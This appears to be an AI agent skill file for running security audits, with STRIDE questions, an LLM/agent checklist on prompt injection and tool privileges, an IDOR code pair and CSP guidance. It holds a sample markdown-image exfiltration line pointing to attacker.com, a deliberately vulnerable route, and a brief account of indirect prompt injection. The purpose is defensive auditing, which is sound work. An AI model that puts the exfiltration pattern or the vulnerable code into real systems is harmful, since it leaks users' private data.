---
name: anthropic-security-audit
description: >-
  Executes an in-depth, rigorous security audit following industry standards (OWASP, STRIDE)
  and frontier AI safety principles (prompt injection defense, tool boundary controls, secret exposure).
  Use when conducting vulnerability reviews, threat modeling, API surface analysis, or pre-release security validation.
---

# Anthropic Security Audit: Comprehensive Threat Modeling & Audit

This skill provides a systematic framework for conducting exhaustive security audits across both classical application layers (web, API, database) and frontier AI agentic systems.

---

## 1. Threat Modeling Framework (STRIDE)

Every surface under review must be interrogated against the six STRIDE categories:
1. **Spoofing**: Can an attacker forge identities, JWT tokens, session cookies, or user IDs?
2. **Tampering**: Can payload bodies, database records, client state, or query params be altered in transit or at rest?
3. **Repudiation**: Are critical state mutations properly audited, timestamped, and attributed?
4. **Information Disclosure**: Are sensitive environment secrets, internal stack traces, API keys, or PII exposed in error messages, client bundles, or logs?
5. **Denial of Service**: Are resource-intensive endpoints protected with rate limiting, payload size caps, pagination limits, and query timeouts?
6. **Elevation of Privilege**: Can a regular user access admin endpoints, bypass role-based access control (RBAC/ABAC), or manipulate IDOR references?

---

## 2. Frontier AI & Agentic Security Checklist

When building or integrating LLM systems and tools:
- **Direct & Indirect Prompt Injection**:
  - Are system prompts treated as untrusted runtime boundaries?
  - Can external web inputs or scraped content inject instructions to override system behavior?
  - Are user inputs separated clearly from instructions (e.g., using delimiters or distinct message roles)?
- **Tool-Call Privileges & Sandboxing**:
  - Does the LLM have unrestricted file read/write or arbitrary command execution without strict authorization?
  - Do tool arguments get strictly validated with strict schemas (e.g., Zod) before execution?
- **Data Exfiltration Vectors**:
  - Can model outputs reflect private data back through rendered markdown images (`![img](https://attacker.com/leak?data=...)`) or hidden iframes?
  - Are markdown outputs sanitized against SVG XSS, script injection, and external tracking pixels?

---

## 3. Web & Application Vulnerability Checks

### 1. Broken Object Level Authorization (BOLA / IDOR)
```typescript
// VULNERABLE: Direct access via param without tenant check
app.get('/api/documents/:id', async (req, res) => {
  const doc = await db.document.findUnique({ where: { id: req.params.id } });
  return res.json(doc);
});

// SECURE: Enforces tenant/user ownership
app.get('/api/documents/:id', requireAuth, async (req, res) => {
  const doc = await db.document.findFirst({
    where: { id: req.params.id, userId: req.user.id }
  });
  if (!doc) return res.status(404).json({ error: 'Document not found' });
  return res.json(doc);
});
```

### 2. Client-Side Secret Leakage
- Inspect build output (`.env`, `next.config.js`, `vite.config.ts`, bundle analyzers).
- Never prefix secrets with `NEXT_PUBLIC_` or `VITE_` unless explicitly intended for the public browser bundle.

### 3. Cross-Site Scripting (XSS) & Dangerous Sinks
- Audit `dangerouslySetInnerHTML`, `v-html`, `eval()`, `new Function()`, `innerHTML`.
- If dynamic HTML is required, sanitize using DOMPurify with strict attribute whitelists.

### 4. Content Security Policy (CSP) & Headers
- Ensure headers enforce:
  - `Content-Security-Policy: default-src 'self'; script-src 'self';`
  - `X-Frame-Options: DENY`
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy: strict-origin-when-cross-origin`

---

## 4. Audit Deliverable Format

When outputting a security audit report:
1. **Executive Summary**: High-level risk score (Critical / High / Medium / Low).
2. **Findings Table**: Vulnerability name, CWE / OWASP classification, CVSS score estimate, file location.
3. **Step-by-Step Proof of Concept (PoC)**: Minimal, reproducible demonstration.
4. **Remediation Code**: Drop-in secure code replacement.

